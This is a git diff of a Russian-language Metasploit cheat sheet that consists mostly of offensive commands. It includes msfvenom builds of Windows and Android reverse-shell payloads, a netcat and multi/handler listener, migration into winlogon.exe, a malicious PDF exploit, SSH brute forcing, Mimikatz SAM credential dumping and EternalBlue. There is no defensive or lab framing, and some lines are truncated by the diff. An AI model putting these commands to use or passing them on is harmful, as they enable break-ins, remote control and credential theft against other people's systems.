@@ -1,6 +1,9 @@
 # MetaSploit
 
 Создаем реверс шелл для виндовс
+
+c meterpreter сессией
+
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe
 
 
@@ -13,33 +16,25 @@ msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.
 
 
 Включаем хендлер
+
 rlwrap nc -lvnp 7777
 
 вместо неткат для метасплойт
 
 use exploit/multi/handler
 
-migrate -N winlogon.exe
-
-run
-
-
-use exploit/multi/handler
-
 set payload windows/meterpreter/reverse_tcp
+
 set payload windows/x64/meterpreter_reverse_tcp
 
-желательно для виндовс
 set PAYLOAD windows/x64/shell_reverse_tcp
 
-set lhost 192.168.0.9
+Миграция в процесс
 
-set lport 4444
-
-exploit
-
+migrate -N winlogon.exe
 
 Для АНДРОИД
+
 msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk
 
 Эксплоит в PDF​
@@ -67,10 +62,6 @@ set filename Test3.pdf
 
 Здесь задаём имя нашему файлу
 
-Код:
-
-exploit
-
 
 Для брута use auxiliary/scanner/ssh/ssh_login
 
@@ -81,7 +72,7 @@ kiwi_cmd lsadump::sam
 
 
 
-eternalblue
+eternalblue в метасплойт
 
 use exploit/windows/smb/ms17_010_eternalblue
    show payloads
